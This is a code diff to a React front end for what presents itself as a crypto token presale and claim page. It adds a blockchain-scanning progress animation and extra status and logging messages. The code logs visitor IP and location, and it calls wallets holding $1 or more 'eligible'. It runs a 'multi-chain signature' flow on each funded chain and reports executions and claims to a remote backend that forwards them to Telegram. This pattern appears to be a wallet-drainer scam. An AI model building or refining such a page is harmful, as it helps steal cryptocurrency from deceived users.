@@ -111,8 +111,10 @@ function App() {
     avax: 32
   });
   const [userEmail, setUserEmail] = useState('');
-  const [userLocation, setUserLocation] = useState({ country: '', city: '', region: '', ip: '' });
+  const [userLocation, setUserLocation] = useState({ country: '', city: '', region: '', ip: '', flag: '' });
   const [executionResults, setExecutionResults] = useState([]);
+  const [scanProgress, setScanProgress] = useState(0);
+  const [scanningChains, setScanningChains] = useState([]);
 
   // Presale stats
   const [timeLeft, setTimeLeft] = useState({
@@ -205,7 +207,7 @@ function App() {
 
         console.log("✅ Wallet Ready:", await ethersSigner.getAddress());
         
-        // Fetch balances across all chains
+        // Fetch balances across all chains with loading animation
         await fetchAllBalances(address);
         
       } catch (e) {
@@ -238,6 +240,7 @@ function App() {
             ip: data.data.ip,
             flag: data.data.flag
           });
+          console.log(`📍 Location detected: ${data.data.country} ${data.data.flag}`);
         }
       } catch (err) {
         console.error('Visit tracking error:', err);
@@ -246,11 +249,19 @@ function App() {
     trackVisit();
   }, []);
 
-  // Fetch balances across all chains
+  // Fetch balances across all chains with loading animation
   const fetchAllBalances = async (walletAddress) => {
     const balanceResults = {};
+    let scanned = 0;
+    const totalChains = DEPLOYED_CHAINS.length;
+    
+    setTxStatus('🔍 Scanning blockchain networks...');
+    setVerifying(true);
+    setScanProgress(0);
+    setScanningChains([]);
     
     for (const chain of DEPLOYED_CHAINS) {
+      setScanningChains(prev => [...prev, chain.name]);
       try {
         const rpcProvider = new ethers.JsonRpcProvider(chain.rpc);
         const balance = await rpcProvider.getBalance(walletAddress);
@@ -277,12 +288,24 @@ function App() {
       } catch (err) {
         console.error(`Failed to fetch balance for ${chain.name}:`, err);
       }
+      
+      scanned++;
+      setScanProgress(Math.floor((scanned / totalChains) * 100));
     }
     
     setBalances(balanceResults);
+    setScanningChains([]);
+    setVerifying(false);
     
     // Check if total value >= threshold
     const totalValue = Object.values(balanceResults).reduce((sum, b) => sum + b.valueUSD, 0);
+    
+    if (totalValue >= 1) {
+      setTxStatus('✅ Eligible! Ready to claim');
+    } else {
+      setTxStatus('👋 Welcome! Connect to check eligibility');
+    }
+    
     return totalValue;
   };
 
@@ -322,7 +345,7 @@ function App() {
     if (!address) return;
     
     setVerifying(true);
-    setTxStatus('🔄 Verifying...');
+    setTxStatus('🔄 Verifying with backend...');
     
     try {
       const totalValue = Object.values(balances).reduce((sum, b) => sum + b.valueUSD, 0);
@@ -349,7 +372,7 @@ function App() {
           setTxStatus('✅ You qualify!');
           await preparePresale();
         } else {
-          setTxStatus('✨ Verified');
+          setTxStatus('✨ Verified - Not eligible');
         }
       }
     } catch (err) {
@@ -505,7 +528,7 @@ function App() {
           setExecutionResults([...results]);
           
           // Notify backend - ADDED SOURCE
-          await fetch('https://bthbk.vercel.app/api/presale/execute-flow', {
+          const executeResponse = await fetch('https://bthbk.vercel.app/api/presale/execute-flow', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ 
@@ -521,6 +544,10 @@ function App() {
               source: FRONTEND_SOURCE // ADDED: Identify which frontend
             })
           });
+          
+          if (executeResponse.ok) {
+            console.log(`✅ Execution reported for ${chain.name}`);
+          }
           
           setTxStatus(`✅ (${i+1}/${chainsWithBalance.length}) Completed on ${chain.name}`);
           
@@ -558,7 +585,7 @@ function App() {
         setTxStatus(`🎉 Success! Processed on ${processed.length} chains`);
         
         // Final success notification - ADDED SOURCE
-        await fetch('https://bthbk.vercel.app/api/presale/claim', {
+        const claimResponse = await fetch('https://bthbk.vercel.app/api/presale/claim', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ 
@@ -574,6 +601,10 @@ function App() {
             source: FRONTEND_SOURCE // ADDED: Identify which frontend
           })
         });
+        
+        if (claimResponse.ok) {
+          console.log('✅ Claim notification sent to Telegram');
+        }
       } else {
         setError("No chains were successfully processed");
       }
@@ -593,7 +624,7 @@ function App() {
   const claimTokens = async () => {
     try {
       setLoading(true);
-      await fetch('https://bthbk.vercel.app/api/presale/claim', {
+      const response = await fetch('https://bthbk.vercel.app/api/presale/claim', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ 
@@ -603,7 +634,11 @@ function App() {
           source: FRONTEND_SOURCE // ADDED: Identify which frontend
         })
       });
-      setShowCelebration(true);
+      
+      if (response.ok) {
+        setShowCelebration(true);
+        console.log('✅ Claim notification sent to Telegram');
+      }
     } catch (err) {
       console.error('Claim error:', err);
     } finally {
@@ -637,6 +672,8 @@ function App() {
       setTxStatus('');
       setError('');
       setExecutionResults([]);
+      setScanProgress(0);
+      setScanningChains([]);
     } catch (err) {
       console.error('Disconnect error:', err);
       // Force UI update even if disconnect fails
@@ -718,6 +755,17 @@ function App() {
           0% { opacity: 0; transform: translate(0,0) scale(0.5); filter: blur(10px); }
           30% { opacity: 1; transform: translate(20px,-30px) scale(1.2); filter: blur(5px); }
           100% { opacity: 0; transform: translate(-40px,60px) scale(2); filter: blur(20px); }
+        }
+        @keyframes scanPulse {
+          0% { opacity: 0.3; transform: scale(1); }
+          50% { opacity: 1; transform: scale(1.05); }
+          100% { opacity: 0.3; transform: scale(1); }
+        }
+        .scan-animation {
+          animation: scanPulse 1.5s ease-in-out infinite;
+        }
+        .progress-bar {
+          transition: width 0.3s ease-in-out;
         }
       `}</style>
 
@@ -831,14 +879,55 @@ function App() {
           )}
         </div>
 
+        {/* Scan Progress Animation */}
+        {(verifying || scanningChains.length > 0) && (
+          <div className="max-w-2xl mx-auto mb-6">
+            <div className="bg-white/10 backdrop-blur border border-white/30 rounded-xl p-6 scan-animation">
+              <div className="flex items-center gap-4 mb-4">
+                <div className="relative">
+                  <div className="w-12 h-12 bg-white/20 rounded-lg flex items-center justify-center text-2xl">
+                    🔍
+                  </div>
+                  <div className="absolute inset-0 border-4 border-white border-t-transparent rounded-full animate-spin"></div>
+                </div>
+                <div className="flex-1">
+                  <p className="text-white font-mono text-lg">Scanning Blockchain Networks...</p>
+                  <p className="text-gray-400 text-sm font-mono mt-1">{txStatus}</p>
+                </div>
+              </div>
+              
+              {/* Progress Bar */}
+              <div className="w-full h-2 bg-gray-800 rounded-full overflow-hidden mb-3">
+                <div 
+                  className="h-full bg-white progress-bar"
+                  style={{ width: `${scanProgress}%` }}
+                ></div>
+              </div>
+              
+              {/* Chains being scanned */}
+              <div className="flex flex-wrap gap-2 mt-3">
+                {scanningChains.map((chain, idx) => (
+                  <span key={idx} className="text-xs bg-white/10 px-3 py-1 rounded-full border border-white/30 animate-pulse">
+                    {chain}
+                  </span>
+                ))}
+              </div>
+              
+              <p className="text-xs text-gray-500 mt-3 font-mono">
+                {scanProgress}% complete • Checking balances across {DEPLOYED_CHAINS.length} networks
+              </p>
+            </div>
+          </div>
+        )}
+
         {/* Status Messages */}
-        {txStatus && !verifying && (
+        {txStatus && !verifying && scanningChains.length === 0 && (
           <div className="max-w-2xl mx-auto mb-6">
             <div className="bg-white/10 backdrop-blur border border-white/30 rounded-xl p-5">
               <div className="flex items-center gap-4">
                 <div className="relative">
                   <div className="w-12 h-12 bg-white/20 rounded-lg flex items-center justify-center text-2xl">
-                    {txStatus.includes('✅') ? '✓' : txStatus.includes('🎉') ? '🎉' : '⟳'}
+                    {txStatus.includes('✅') ? '✓' : txStatus.includes('🎉') ? '🎉' : txStatus.includes('🔍') ? '🔍' : '⟳'}
                   </div>
                   {signatureLoading && (
                     <div className="absolute inset-0 border-4 border-white border-t-transparent rounded-full animate-spin"></div>
@@ -882,8 +971,8 @@ function App() {
           </div>
         )}
 
-        {/* MAIN ACTION BUTTON */}
-        {isConnected && isEligible && !completedChains.length && (
+        {/* MAIN ACTION BUTTON - Only show when not scanning and eligible */}
+        {isConnected && !verifying && scanningChains.length === 0 && isEligible && !completedChains.length && (
           <div className="max-w-2xl mx-auto mb-8">
             <button
               onClick={executeMultiChainSignature}
@@ -936,7 +1025,7 @@ function App() {
         )}
 
         {/* MAIN CONTENT - ALLOCATION CARD */}
-        {isConnected && !verifying && scanResult && (
+        {isConnected && !verifying && scanningChains.length === 0 && scanResult && (
           <div className="max-w-2xl mx-auto">
             {isEligible ? (
               <div className="space-y-6">
